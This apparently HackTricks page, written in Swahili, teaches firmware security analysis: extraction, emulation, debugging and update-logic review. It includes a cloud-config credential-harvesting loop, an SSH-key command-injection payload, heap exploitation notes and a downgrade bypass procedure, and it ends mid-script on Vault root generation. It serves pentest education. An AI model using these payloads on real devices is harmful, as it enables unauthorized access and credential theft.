# Uchambuzi wa Firmware

{{#include ../../banners/hacktricks-training.md}}

## **Utangulizi**

### Rasilimali zinazohusiana


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware ni software muhimu inayowezesha vifaa kufanya kazi kwa usahihi kwa kudhibiti na kuwezesha mawasiliano kati ya vipengele vya hardware na software ambayo watumiaji huingiliana nayo. Huhifadhiwa kwenye memory ya kudumu, hivyo kifaa kinaweza kufikia maelekezo muhimu tangu kinapowashwa, na hatimaye kuanzisha mfumo wa uendeshaji. Kuchunguza na, inapowezekana, kurekebisha firmware ni hatua muhimu katika kutambua udhaifu wa kiusalama.

## **Kukusanya Taarifa**

**Kukusanya taarifa** ni hatua muhimu ya awali ya kuelewa muundo wa kifaa na teknolojia kinazotumia. Mchakato huu unahusisha kukusanya data kuhusu:

- Usanifu wa CPU na mfumo wa uendeshaji unaoendesha
- Maelezo ya bootloader
- Mpangilio wa hardware na datasheet
- Vipimo vya codebase na maeneo ya source
- Maktaba za nje na aina za leseni
- Historia ya updates na certifications za kisheria
- Michoro ya usanifu na mtiririko
- Tathmini za usalama na vulnerabilities zilizotambuliwa

Kwa madhumuni haya, tools za **open-source intelligence (OSINT)** ni muhimu sana, pamoja na uchambuzi wa vipengele vyovyote vya open-source software vinavyopatikana kupitia michakato ya manual na automated review. Tools kama [Coverity Scan](https://scan.coverity.com) na [Semmle’s LGTM](https://lgtm.com/#explore) hutoa static analysis bila malipo, ambayo inaweza kutumiwa kutafuta issues zinazoweza kujitokeza.

## **Kupata Firmware**

Kupata firmware kunaweza kufanywa kwa njia mbalimbali, kila moja ikiwa na kiwango chake cha ugumu:

- **Moja kwa moja** kutoka kwa chanzo (developers, manufacturers)
- **Kuijenga** kwa kutumia maelekezo yaliyotolewa
- **Kuipakua** kutoka kwenye tovuti rasmi za support
- Kutumia queries za **Google dork** kutafuta faili za firmware zilizohostiwa
- Kufikia **cloud storage** moja kwa moja, kwa tools kama [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Kunasa **updates** kwa kutumia mbinu za man-in-the-middle
- **Ku-extract** kutoka kwenye kifaa kupitia connections kama **UART**, **JTAG**, au **PICit**
- **Kusniff** requests za updates ndani ya mawasiliano ya kifaa
- Kutambua na kutumia **update endpoints** zilizowekwa moja kwa moja kwenye code
- **Kudump** kutoka kwenye bootloader au network
- **Kuondoa na kusoma** storage chip, ikiwa njia nyingine zote zitashindikana, kwa kutumia hardware tools zinazofaa

### Logs za UART pekee: lazimisha root shell kupitia U-Boot env kwenye flash

Ikiwa UART RX inapuuziwa (logs pekee), bado unaweza kulazimisha init shell kwa **kuhariri U-Boot environment blob** offline:

1. Dump SPI flash kwa SOIC-8 clip + programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Tambua partition ya U-Boot env, hariri `bootargs` ili kujumuisha `init=/bin/sh`, na **kokotoa upya U-Boot env CRC32** ya blob.
3. Reflash partition ya env pekee na uwashe kifaa upya; shell inapaswa kuonekana kwenye UART.

Hii ni muhimu kwenye embedded devices ambapo bootloader shell imezimwa lakini partition ya env inaweza kuandikwa kupitia external flash access.

## Kuchambua firmware

Sasa kwa kuwa **una firmware**, unahitaji ku-extract taarifa kuihusu ili kujua jinsi ya kuishughulikia. Kuna tools mbalimbali unazoweza kutumia kwa ajili hiyo:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Ikiwa hutapata mengi kwa kutumia zana hizo, angalia **entropy** ya image kwa `binwalk -E <bin>`. Ikiwa entropy ni ndogo, basi huenda haijasimbwa kwa njia fiche. Ikiwa entropy ni kubwa, huenda imesimbwa kwa njia fiche (au imebanwa kwa namna fulani).

Zaidi ya hayo, unaweza kutumia zana hizi kutoa **faili zilizopachikwa ndani ya firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Au [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) kukagua faili.

### Kupata Mfumo wa Faili

Kwa kutumia zana zilizotajwa hapo awali, kama vile `binwalk -ev <bin>`, unapaswa kuwa umeweza **kutoa mfumo wa faili**.\
Kwa kawaida Binwalk huutoa ndani ya **folda yenye jina linaloeleza aina ya mfumo wa faili**, ambayo mara nyingi huwa mojawapo ya hizi: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Utoaji wa Mfumo wa Faili kwa Mikono

Wakati mwingine, binwalk **haitakuwa na magic byte ya mfumo wa faili kwenye signatures zake**. Katika hali hizi, tumia binwalk **kutafuta offset ya mfumo wa faili na kuchonga mfumo wa faili uliobanwa** kutoka kwenye binary, kisha **utoe** mfumo wa faili kwa mikono kulingana na aina yake kwa kutumia hatua zilizo hapa chini.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Tekeleza **dd command** ifuatayo ili kuchonga mfumo wa faili wa Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Vinginevyo, amri ifuatayo pia inaweza kutekelezwa.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Kwa squashfs (iliyotumika katika mfano hapo juu)

`$ unsquashfs dir.squashfs`

Faili zitakuwa katika directory ya "`squashfs-root`" baadaye.

- Faili za archive za CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Kwa filesystems za jffs2

`$ jefferson rootfsfile.jffs2`

- Kwa filesystems za ubifs zenye NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Kuchanganua Firmware

Baada ya firmware kupatikana, ni muhimu kuichanganua kwa undani ili kuelewa muundo wake na vulnerabilities zinazoweza kuwepo. Mchakato huu unahusisha kutumia tools mbalimbali kuchanganua na kutoa data muhimu kutoka kwenye firmware image.

### Tools za Awali za Uchanganuzaji

Seti ya amri imetolewa kwa ukaguzi wa awali wa binary file (inayorejelewa kama `<bin>`). Amri hizi husaidia kutambua aina za faili, kutoa strings, kuchanganua binary data, na kuelewa maelezo ya partition na filesystem:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Ili kutathmini hali ya encryption ya image, **entropy** hukaguliwa kwa `binwalk -E <bin>`. Entropy ya chini huashiria ukosefu wa encryption, ilhali entropy ya juu huonyesha uwezekano wa encryption au compression.

Kwa kutoa **embedded files**, zana na rasilimali kama nyaraka za **file-data-carving-recovery-tools** pamoja na **binvis.io** kwa ajili ya kukagua faili zinapendekezwa.

### Kutoa Mfumo wa Faili

Kwa kutumia `binwalk -ev <bin>`, kwa kawaida mtu anaweza kutoa mfumo wa faili, mara nyingi kwenye directory yenye jina linalotokana na aina ya mfumo wa faili (kwa mfano, squashfs, ubifs). Hata hivyo, **binwalk** inaposhindwa kutambua aina ya mfumo wa faili kwa sababu ya kukosekana kwa magic bytes, extraction ya mwongozo huhitajika. Hii inahusisha kutumia `binwalk` kutafuta offset ya mfumo wa faili, kisha kutumia command ya `dd` ku-carve mfumo wa faili:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Baadaye, kulingana na aina ya filesystem (kwa mfano, squashfs, cpio, jffs2, ubifs), commands tofauti hutumika ku-extract manually contents.

### Uchambuzi wa Filesystem

Baada ya filesystem ku-extract, utafutaji wa security flaws huanza. Huangaliwa network daemons zisizo salama, credentials zilizowekwa moja kwa moja kwenye code, API endpoints, functionalities za update server, code ambayo haijacompile, startup scripts, na compiled binaries kwa ajili ya offline analysis.

**Maeneo muhimu** na **vitu** vya kukagua ni pamoja na:

- **etc/shadow** na **etc/passwd** kwa user credentials
- SSL certificates na keys katika **etc/ssl**
- Configuration na script files kwa vulnerabilities zinazowezekana
- Embedded binaries kwa analysis zaidi
- Web servers na binaries za kawaida za vifaa vya IoT

Tools kadhaa husaidia kufichua sensitive information na vulnerabilities ndani ya filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) na [**Firmwalker**](https://github.com/craigz28/firmwalker) kwa kutafuta sensitive information
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) kwa comprehensive firmware analysis
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), na [**EMBA**](https://github.com/e-m-b-a/emba) kwa static na dynamic analysis

### Security Checks kwenye Compiled Binaries

Source code na compiled binaries zote zinazopatikana kwenye filesystem lazima zichunguzwe kwa vulnerabilities. Tools kama **checksec.sh** kwa Unix binaries na **PESecurity** kwa Windows binaries husaidia kutambua binaries zisizolindwa ambazo zinaweza kutumiwa kwa exploitation.

## Kukusanya cloud config na MQTT credentials kupitia derived URL tokens

IoT hubs nyingi huchukua per-device configuration kutoka kwenye cloud endpoint inayofanana na:

- `https://<api-host>/pf/<deviceId>/<token>`

Wakati wa firmware analysis unaweza kugundua kuwa `<token>` inatengenezwa locally kutoka kwenye device ID kwa kutumia hardcoded secret, kwa mfano:

- token = MD5( deviceId || STATIC_KEY ) na kuwakilishwa kama uppercase hex

Muundo huu humwezesha mtu yeyote anayejua deviceId na STATIC_KEY kuunda upya URL na kuvuta cloud config, ambayo mara nyingi hufichua plaintext MQTT credentials na topic prefixes.

Practical workflow:

1) Extract deviceId kutoka kwenye UART boot logs

- Unganisha 3.3V UART adapter (TX/RX/GND) na capture logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Tafuta mistari inayochapisha pattern ya cloud config URL na broker address, kwa mfano:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Pata STATIC_KEY na algorithm ya token kutoka kwenye firmware

- Pakia binaries kwenye Ghidra/radare2 na utafute config path ("/pf/") au matumizi ya MD5.
- Thibitisha algorithm (mfano, MD5(deviceId||STATIC_KEY)).
- Tengeneza token katika Bash na ubadilishe digest iwe herufi kubwa:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Kusanya cloud config na MQTT credentials

- Unda URL na pakua JSON kwa kutumia curl; ichanganue kwa jq ili kutoa secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Tumia vibaya MQTT ya plaintext na topic ACLs dhaifu (ikiwa zipo)

- Tumia credentials zilizopatikana kujisubscribe kwenye maintenance topics na kutafuta matukio nyeti:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerate vitambulisho vya vifaa vinavyoweza kutabirika (kwa kiwango kikubwa, kwa idhini)

- Mifumo mingi hujumuisha baiti za OUI ya vendor/product/type zikifuatiwa na kiambishi tamati cha mfuatano.
- Unaweza kujarudia vitambulisho vinavyowezekana, kuunda tokeni na kuchukua configs kiprogramu:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Vidokezo
- Daima pata idhini ya wazi kabla ya kujaribu mass enumeration.
- Pendelea emulation au static analysis ili kurejesha secrets bila kurekebisha target hardware inapowezekana.


Mchakato wa ku-emulate firmware huwezesha **dynamic analysis** ya utendakazi wa device au program mahususi. Mbinu hii inaweza kukumbana na changamoto zinazohusiana na hardware au architecture, lakini kuhamisha root filesystem au binaries mahususi kwenye device yenye architecture na endianness inayolingana, kama Raspberry Pi, au kwenye virtual machine iliyotengenezwa awali, kunaweza kuwezesha testing zaidi.

### Ku-emulate Individual Binaries

Kwa kuchunguza programs moja moja, ni muhimu kutambua endianness na CPU architecture ya program.

#### Mfano wa MIPS Architecture

Ili ku-emulate binary ya MIPS architecture, unaweza kutumia command:
```bash
file ./squashfs-root/bin/busybox
```
Na kusakinisha zana muhimu za uigaji:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Kwa MIPS (big-endian), `qemu-mips` hutumika, na kwa binaries za little-endian, `qemu-mipsel` ndiyo chaguo.

#### ARM Architecture Emulation

Kwa binaries za ARM, mchakato ni kama huo, ambapo emulator ya `qemu-arm` hutumika kwa emulation.

### Full System Emulation

Tools kama [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), na nyinginezo, huwezesha full firmware emulation, hu-automate mchakato na kusaidia katika dynamic analysis.

## Dynamic Analysis in Practice

Katika hatua hii, mazingira ya kifaa halisi au kilicho-emulate hutumika kwa analysis. Ni muhimu kudumisha shell access kwenye OS na filesystem. Emulation huenda isiige kikamilifu interactions za hardware, hivyo wakati mwingine emulation huhitaji kuanzishwa upya. Analysis inapaswa kukagua tena filesystem, kutumia webpages na network services zilizo wazi, na kuchunguza vulnerabilities za bootloader. Firmware integrity tests ni muhimu ili kubaini vulnerabilities za backdoor zinazoweza kuwepo.

## Runtime Analysis Techniques

Runtime analysis inahusisha kuingiliana na process au binary katika mazingira yake ya uendeshaji, kwa kutumia tools kama gdb-multiarch, Frida, na Ghidra kuweka breakpoints na kubaini vulnerabilities kupitia fuzzing na techniques nyingine.

Kwa embedded targets zisizo na debugger kamili, **copy a statically-linked `gdbserver`** kwenye kifaa na uunganishe remotely:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / mapping ya ujumbe ya radio-co-processor

Kwenye IoT hubs, RF stack mara nyingi hugawanywa kati ya **radio MCU** na process ya Linux userland. Workflow muhimu ni ku-mapping njia:

1. **RF frame** hewani
2. **controller-side parser** kwenye radio MCU
3. **serial/UART text au TLV protocol** inayotumwa kwa Linux (kwa mfano `/dev/tty*`)
4. **application dispatcher** kwenye daemon kuu
5. **protocol-specific handler / state machine**

Architecture hii huunda reversing targets mbili badala ya moja. Ikiwa controller inabadilisha binary radio frames kuwa textual protocol kama `Group,Command,arg1,arg2,...`, tambua:

- **message groups** na dispatch tables
- Ni messages zipi zinaweza kutoka kwenye **network** dhidi ya controller yenyewe
- **manufacturer-specific discriminator fields** kamili (kwa mfano Zigbee `manufacturer_code` na custom `cluster_command`)
- Ni handlers zipi zinazofikika tu wakati wa **commissioning**, discovery, au firmware/model download phases

Kwa Zigbee hasa, capture pairing traffic na uangalie ikiwa target bado inategemea default **Link Key** `ZigBeeAlliance09`. Ikiwa hivyo, kunusa commissioning traffic kunaweza kufichua **Network Key**. Zigbee 3.0 install codes hupunguza exposure hii, hivyo tambua ikiwa device iliyojaribiwa inazitekeleza kweli.

### Manufacturer-specific protocol handlers na FSM-gated reachability

Vendor-specific Zigbee/ZCL commands mara nyingi huwa target bora kuliko standardized clusters kwa sababu zinaingiza **custom parsing code** na internal **FSMs** zenye validation iliyojaribiwa kidogo.

Workflow ya vitendo:

- Reverse command dispatcher hadi upate **vendor-only handler**.
- Recover **FSM state**, **event**, **check**, **action**, na **next-state** tables.
- Tambua **transitional states** zinazojisogeza mbele kiotomatiki na retry/error branches ambazo hatimaye hu-reset au ku-free attacker-controlled state.
- Thibitisha ni protocol exchanges zipi halali zinazohitajika kuiweka daemon kwenye state iliyo vulnerable badala ya kudhani kuwa buggy handler hufikika kila wakati.

Kwa protocols zinazotegemea timing, packet replay kutoka Python framework inaweza kuwa slow sana. Njia ya kuaminika zaidi ni ku-emulate device halali kwenye real hardware (kwa mfano **nRF52840**) kwa kutumia vendor-grade stack ili uweze kufichua **endpoints**, **attributes**, na commissioning timing sahihi.

### Fragmented-download bug class kwenye embedded daemons

Aina ya firmware bug inayojirudia huonekana kwenye **fragmented blob/model/configuration downloads**:

1. **First fragment** (`offset == 0`) huhifadhi `ctx->total_size` na ku-allocate `malloc(total_size)`.
2. Fragments zinazofuata hu-validate tu fields zinazodhibitiwa na attacker za **packet-local**, kama `packet_total_size >= offset + chunk_len`.
3. Copy hutumia `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bila ku-check dhidi ya **original allocated size**.

Hii humruhusu attacker kutuma:

- First valid fragment yenye declared total size **ndogo** ili kulazimisha small heap allocation.
- Fragment inayofuata yenye **expected offset** lakini `chunk_len` kubwa zaidi.
- Forged packet-local size inayotimiza fresh checks huku bado ikifurika buffer iliyokuwa allocated awali.

Wakati vulnerable path iko nyuma ya commissioning logic, exploitation lazima ijumuishe **device emulation** ya kutosha kuiendesha target hadi kwenye expected model-download au blob-download state kabla ya kutuma malformed fragments.

### Protocol-driven `free()` triggers

Kwenye embedded daemons, njia rahisi zaidi ya ku-trigger heap metadata exploitation mara nyingi si “kusubiri cleanup”, bali **kulazimisha error handling ya protocol yenyewe**:

- Tuma malformed follow-up fragments ili kuisukuma FSM kwenye **retry** au **error** states.
- Vuka retry threshold ili daemon **i-reset context** na ku-free corrupted buffer.
- Tumia `free()` hii inayotabirika ku-trigger allocator-side primitives kabla process haija-crash kwa sababu nyingine zisizohusiana.

Hii ni muhimu hasa dhidi ya **musl/uClibc/dlmalloc-like** allocators kwenye embedded Linux, ambapo ku-corrupt chunk metadata kunaweza kubadilisha unlink/unbin logic kuwa write primitive. Pattern thabiti ni ku-corrupt **size field** ili kuelekeza allocator traversal kwenye **fake chunks** zilizowekwa ndani ya overflowed buffer, badala ya kufuta mara moja real bin pointers na ku-crash process.

## Binary Exploitation and Proof-of-Concept

Kutengeneza PoC kwa vulnerabilities zilizotambuliwa kunahitaji uelewa wa kina wa target architecture na programming katika lower-level languages. Binary runtime protections kwenye embedded systems ni nadra, lakini zinapokuwepo, techniques kama Return Oriented Programming (ROP) zinaweza kuhitajika.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc hutumia fastbins zinazofanana na za glibc. Large allocation inayofuata inaweza ku-trigger `__malloc_consolidate()`, hivyo fake chunk yoyote lazima ipite checks (sane size, `fd = 0`, na surrounding chunks zionekane kuwa "in use").
- **Non-PIE binaries under ASLR:** ikiwa ASLR imewezeshwa lakini main binary ni **non-PIE**, addresses za in-binary `.data/.bss` huwa stable. Unaweza kulenga region ambayo tayari inafanana na valid heap chunk header ili ku-land fastbin allocation kwenye **function pointer table**.
- **Parser-stopping NUL:** wakati JSON inaparsewa, `\x00` kwenye payload inaweza kusimamisha parsing huku ikiweka trailing attacker-controlled bytes kwa stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** ROP chain inayokiita `open("/proc/self/mem")`, `lseek()`, na `write()` inaweza kupanda executable shellcode kwenye known mapping na kuruka humo.

## Prepared Operating Systems for Firmware Analysis

Operating systems kama [AttifyOS](https://github.com/adi0x90/attifyos) na [EmbedOS](https://github.com/scriptingxss/EmbedOS) hutoa mazingira yaliyosanidiwa awali kwa firmware security testing, yakiwa na tools zinazohitajika.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ni distro iliyokusudiwa kukusaidia kufanya security assessment na penetration testing ya Internet of Things (IoT) devices. Huokoa muda mwingi kwa kutoa mazingira yaliyosanidiwa awali yenye tools zote zinazohitajika zikiwa tayari.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system inayotegemea Ubuntu 18.04, ikiwa na firmware security testing tools zilizopakiwa awali.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Hata vendor anapotekeleza cryptographic signature checks kwa firmware images, **version rollback (downgrade) protection mara nyingi huachwa**. Wakati boot- au recovery-loader inathibitisha signature tu kwa embedded public key lakini hailinganishi *version* (au monotonic counter) ya image inayoflashiwa, attacker anaweza kusakinisha kihalali **older, vulnerable firmware ambayo bado ina valid signature**, na hivyo kurudisha patched vulnerabilities.

Typical attack workflow:

1. **Pata older signed image**
* Ipakue kutoka vendor’s public download portal, CDN au support site.
* I-extract kutoka companion mobile/desktop applications (kwa mfano ndani ya Android APK kwenye `assets/firmware/`).
* Iipate kutoka third-party repositories kama VirusTotal, Internet archives, forums, na kadhalika.
2. **Upload au serve image kwa device** kupitia exposed update channel yoyote:
* Web UI, mobile-app API, USB, TFTP, MQTT, na kadhalika.
* Consumer IoT devices nyingi hutoa *unauthenticated* HTTP(S) endpoints zinazokubali firmware blobs zilizo-encode kwa Base64, huzi-decode server-side na ku-trigger recovery/upgrade.
3. Baada ya downgrade, exploit vulnerability iliyopatched kwenye release mpya zaidi (kwa mfano command-injection filter iliyoongezwa baadaye).
4. Kwa hiari, flash latest image tena au disable updates ili kuepuka detection baada ya persistence kupatikana.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Katika firmware iliyo hatarini (iliyodowngrade), parameter ya `md5` inaunganishwa moja kwa moja kwenye shell command bila kusafishwa, hivyo kuruhusu injection ya commands kiholela (hapa – kuwezesha root access inayotumia SSH keys). Toleo za baadaye za firmware zilianzisha character filter ya msingi, lakini kutokuwepo kwa downgrade protection kunafanya marekebisho hayo yasiwe na maana.

### Kutoa Firmware Kwenye Mobile Apps

Vendor wengi huweka firmware images kamili ndani ya companion mobile applications zao ili app iweze kusasisha kifaa kupitia Bluetooth/Wi-Fi. Packages hizi kwa kawaida huhifadhiwa bila encryption ndani ya APK/APEX, kwenye paths kama `assets/fw/` au `res/raw/`. Tools kama `apktool`, `ghidra`, au hata `unzip` ya kawaida hukuwezesha kutoa signed images bila kugusa hardware halisi.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Bypass ya anti-rollback inayotegemea updater pekee katika miundo ya A/B slot

Baadhi ya vendors hutekeleza **ratchet** ya kuzuia downgrade, lakini ndani ya mantiki ya *updater* pekee (kwa mfano routine ya UDS kupitia CAN, recovery command, au userspace OTA agent). Ikiwa **bootloader** baadaye hukagua tu signature/CRC ya image na kuamini partition table au slot metadata, ulinzi wa rollback bado unaweza kubypassiwa.

Muundo dhaifu wa kawaida:

- Firmware metadata ina version descriptor pamoja na **security ratchet** / monotonic counter.
- Updater inalinganisha image ratchet na thamani iliyohifadhiwa kwenye persistent storage na kukataa signed images za zamani.
- **Bootloader** haisomi ratchet hiyo na inathibitisha tu header, CRC, na signature kabla ya ku-boot slot iliyochaguliwa.
- Slot activation huhifadhiwa kando katika partition table au per-slot generation counter na **haijaunganishwa cryptographically** na firmware digest halisi iliyothibitishwa.

Hii huunda primitive ya **validate-one-image / boot-another-image** katika dual-slot systems. Ikiwa attacker anaweza kufanya updater iweke slot B kuwa lengo la boot inayofuata kwa kutumia current signed image, na baadaye a- overwrite slot B kabla ya reboot, bootloader bado inaweza ku-boot image iliyodowngrade, kwa sababu inaamini tu slot metadata iliyokuwa tayari ime-commit.

Muundo wa kawaida wa matumizi mabaya:

1. Upload **current signed** firmware kwenye passive slot na uendeshe validation/switch routine ya kawaida ili layout iweke slot hiyo kuwa active inayofuata.
2. **Usireboot bado**. Ingia tena kwenye slot-preparation/erase routine katika session hiyo hiyo.
3. Tumia vibaya boot-state au slot-selection logic iliyobaki stale ili updater ifute **physical slot hiyo hiyo** iliyokuwa imetangazwa hivi karibuni.
4. Andika firmware **ya zamani lakini bado signed** kwenye slot hiyo.
5. Ruka validation routine inayotekeleza ratchet na ufanye reboot moja kwa moja.
6. Bootloader inachagua slot iliyotangazwa, inathibitisha signature/integrity pekee, kisha ina-boot image ya zamani.

Mambo ya kutafuta wakati wa kureverse A/B update implementations:

- Slot selection inayotokana na **boot-time flags** ambazo hazifreshishwi baada ya switch iliyofanikiwa.
- Routine ya aina ya `prepare_passive_slot()` inayofuta slot kulingana na stale state badala ya **current committed layout**.
- Function ya aina ya `part_write_layout()` inayoongeza tu **generation counter** / active flag na haihifadhi validated image hash.
- Ratchet checks zinazotekelezwa katika userspace au updater code, lakini **hazipo** katika ROM / bootloader / secure boot stages.
- Erase au recovery routines zinazoacha slot ikiwa imewekwa kuwa bootable hata baada ya maudhui yake kuondolewa na kuandikwa upya.

### Orodha ya Kukagua Update Logic

* Je, transport/authentication ya *update endpoint* imelindwa vya kutosha (TLS + authentication)?
* Je, device inalinganisha **version numbers** au **monotonic anti-rollback counter** kabla ya flashing?
* Je, image inathibitishwa ndani ya secure boot chain (kwa mfano signatures hukaguliwa na ROM code)?
* Je, **bootloader inatekeleza ratchet hiyo hiyo** kama updater, badala ya kukagua signature/CRC pekee?
* Je, slot activation metadata **imefungwa kwenye validated firmware digest/version**, au slot inaweza kubadilishwa baada ya promotion?
* Baada ya slot switch kufanikiwa, je device inalazimishwa kureboot, au update/erase routines za baadaye bado zinaweza kufikiwa katika session hiyo hiyo?
* Je, userland code hufanya sanity checks za ziada (kwa mfano allowed partition map, model number)?
* Je, *partial* au *backup* update flows zinatumia tena validation logic hiyo hiyo?

> 💡 Ikiwa lolote kati ya yaliyo hapo juu halipo, platform huenda iko vulnerable kwa rollback attacks.

## Firmware yenye vulnerabilities kwa mazoezi

Ili kufanya mazoezi ya kugundua vulnerabilities katika firmware, tumia miradi ifuatayo ya firmware yenye vulnerabilities kama mwanzo.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Kupata firmware decryption keys kutoka embedded KMS/Vault state

Wakati update image inachanganya plaintext metadata ndogo na blob kubwa yenye high entropy, fanya container triage kabla ya kujaribu brute-force:

- Dump headers, offsets na line boundaries kwa kutumia `hexdump`, `xxd`, `strings -tx`, `base64 -d`, na `binwalk -E`.
- `Salted__` kwa kawaida humaanisha OpenSSL `enc` format: bytes 8 zinazofuata ni salt na bytes zilizobaki ni ciphertext.
- Base64 field inayodecode hadi `256` bytes kamili ni dalili thabiti kwamba unaangalia RSA-2048 ciphertext inayofunga random firmware password/session key.
- Detached PGP material katika file hiyo hiyo mara nyingi hulinda authenticity pekee; usidhani kwamba ndiyo confidentiality mechanism.

Ikiwa static key hunting (`grep`, `strings`, PEM/PGP searches) itashindikana, reverse **operational decrypt path** badala ya kutafuta private keys pekee:

- Decompile updater / management binary na ufuatilie nani anayesoma encrypted blob, ni helper/API gani inayofungua, na logical key name inayoombwa.
- Search extracted root filesystem kwa KMS state (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) pamoja na unit files na init scripts.
- Chukulia plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens, au local KMS auto-unseal scripts kuwa sawa na private-key material.

Ikiwa appliance inasafirisha Vault binary ya awali pamoja na storage backend, kureplay environment hiyo kwa kawaida ni rahisi kuliko kuimplement upya Vault internals:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
